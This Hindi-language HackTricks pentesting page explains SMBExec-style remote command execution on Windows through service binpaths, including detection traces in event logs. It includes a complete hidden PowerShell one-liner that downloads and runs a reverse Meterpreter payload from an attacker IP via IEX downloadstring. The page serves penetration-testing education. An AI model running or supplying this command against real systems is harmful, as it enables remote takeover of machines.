# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram समूह**](https://t.me/peass) में शामिल हों या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.**

</details>

## यह कैसे काम करता है

**Smbexec Psexec की तरह काम करता है।** इस उदाहरण में, हम "_binpath_" को पीड़ित के अंदर के दुर्भावनापूर्ण एक्जीक्यूटेबल की ओर इशारा करने के **बजाय**, हम इसे **cmd.exe या powershell.exe** की ओर इशारा करेंगे और वे बैकडोर को डाउनलोड और निष्पादित करेंगे।

## **SMBExec**

आइए देखते हैं कि smbexec चलने पर क्या होता है, हमलावर और लक्ष्य के पक्ष से इसे देखकर:

![](../../.gitbook/assets/smbexec\_prompt.png)

तो हम जानते हैं कि यह "BTOBTO" नामक एक सेवा बनाता है। लेकिन जब हम `sc query` करते हैं तो वह सेवा लक्ष्य मशीन पर मौजूद नहीं होती। सिस्टम लॉग्स में जो हुआ उसका सुराग मिलता है:

![](../../.gitbook/assets/smbexec\_service.png)

सेवा फ़ाइल नाम में निष्पादित करने के लिए एक कमांड स्ट्रिंग होती है (%COMSPEC% cmd.exe के पूर्ण पथ की ओर इशारा करता है)। यह निष्पादित होने वाले कमांड को एक बैट फ़ाइल में इको करता है, stdout और stderr को एक Temp फ़ाइल में रीडायरेक्ट करता है, फिर बैट फ़ाइल को निष्पादित करता है और उसे हटा देता है। Kali पर वापस, Python स्क्रिप्ट तब SMB के माध्यम से आउटपुट फ़ाइल को खींचती है और हमारे "pseudo-shell" में सामग्री प्रदर्शित करती है। हमारे "शेल" में हम जो भी कमांड टाइप करते हैं, एक नई सेवा बनाई जाती है और प्रक्रिया दोहराई जाती है। इसलिए इसे बाइनरी ड्रॉप करने की जरूरत नहीं होती, यह केवल प्रत्येक वांछित कमांड को एक नई सेवा के रूप में निष्पादित करता है। निश्चित रूप से अधिक चुपके, लेकिन जैसा कि हमने देखा, प्रत्येक निष्पादित कमांड के लिए एक इवेंट लॉग बनाया जाता है। फिर भी एक गैर-इंटरैक्टिव "शेल" प्राप्त करने का एक बहुत ही चतुर तरीका!

## मैनुअल SMBExec

**या सेवाओं के माध्यम से कमांड निष्पादित करना**

जैसा कि smbexec ने दिखाया, बाइनरी की आवश्यकता के बिना सीधे सेवा बिनपाथ्स से कमांड निष्पादित करना संभव है। यदि आपको लक्ष्य Windows मशीन पर केवल एक मनमाना कमांड निष्पादित करना है तो यह एक उपयोगी चाल हो सकती है। एक त्वरित उदाहरण के रूप में, आइए बिना बाइनरी के एक रिमोट सेवा का उपयोग करके एक Meterpreter शेल प्राप्त करें।

हम Metasploit के `web_delivery` मॉड्यूल का उपयोग करेंगे और एक PowerShell लक्ष्य का चयन करेंगे जिसमें एक रिवर्स Meterpreter पेलोड हो। लिसनर सेट अप है और यह हमें लक्ष्य मशीन पर निष्पादित करने के लिए कमांड बताता है:
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
हमारे Windows अटैक बॉक्स से, हम एक रिमोट सर्विस ("metpsh") बनाते हैं और binPath को हमारे पेलोड के साथ cmd.exe को एक्जीक्यूट करने के लिए सेट करते हैं:

![](../../.gitbook/assets/sc\_psh\_create.png)

और फिर इसे स्टार्ट करते हैं:

![](../../.gitbook/assets/sc\_psh\_start.png)

यह एरर दिखाता है क्योंकि हमारी सर्विस रिस्पॉन्ड नहीं करती, लेकिन अगर हम हमारे Metasploit लिसनर को देखें तो हमें पता चलता है कि कॉलबैक हुआ और पेलोड एक्जीक्यूट हुआ।

सभी जानकारी यहाँ से निकाली गई थी: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.**

</details>
